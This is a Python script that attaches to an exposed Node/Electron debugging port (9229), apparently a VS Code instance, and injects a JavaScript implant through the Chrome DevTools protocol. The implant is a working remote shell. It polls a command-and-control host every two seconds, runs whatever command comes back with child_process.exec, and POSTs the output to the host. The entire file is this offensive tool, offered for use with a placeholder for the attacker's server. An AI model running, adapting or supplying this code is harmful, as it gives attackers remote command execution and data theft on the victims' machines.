import PyChromeDevTools


chrome = PyChromeDevTools.ChromeInterface(port=9229)


shellcode = '''
//add your C&C host here
var shellUrl = '0.0.0.0'
//debug purposes, if you want to kill the shell in a running VS instance pass var runShell = false in console
var runShell = true;


//HTTP POST for submitting command output
function shellSendResult(result, require){
var http = require('http');


var options = {
host: shellUrl,
path: '/',
method: 'POST',
headers: {
'Content-Type': 'text/html',
'Content-Length': Buffer.byteLength(result),
},
};


callback = function(response) {
var str = ''
response.on('data', function (chunk) {
str += chunk;
});


response.on('end', function () {
console.log(str);
});
}


var req = http.request(options, callback);
req.write(result);
req.end();
}


//HTTP GET for getting commands from the server
function shellGetCommand(require){
console.log("Checking in");
var http = require('http');


var options = {
host: shellUrl,
path: '/'
};


callback = function(response) {
var str = '';


response.on('data', function (chunk) {
str += chunk;
});


response.on('end', function () {
console.log(str);
const { exec } = require('node:child_process');
if (str !== "#") {
exec(str, (error, stdout, stderr) => {
console.log(stdout + " " + stderr);
shellSendResult(stdout + " " + stderr, require);
});
}
});
}


http.request(options, callback).end();
}


//awkward way of sleeping in JavaScript
function resolveAfter2Seconds() {
return new Promise(resolve => {
setTimeout(() => {
resolve('resolved');
}, 2000);
});
}


//async function for creating a loop with delay
async function shellAsyncCall(require) {
while(runShell){
const result = await resolveAfter2Seconds();
shellGetCommand(require)
}
}


shellAsyncCall(require);
'''


chrome.Runtime.enable();
chrome.Runtime.evaluate(expression=shellcode, contextId=1, includeCommandLineAPI=True)
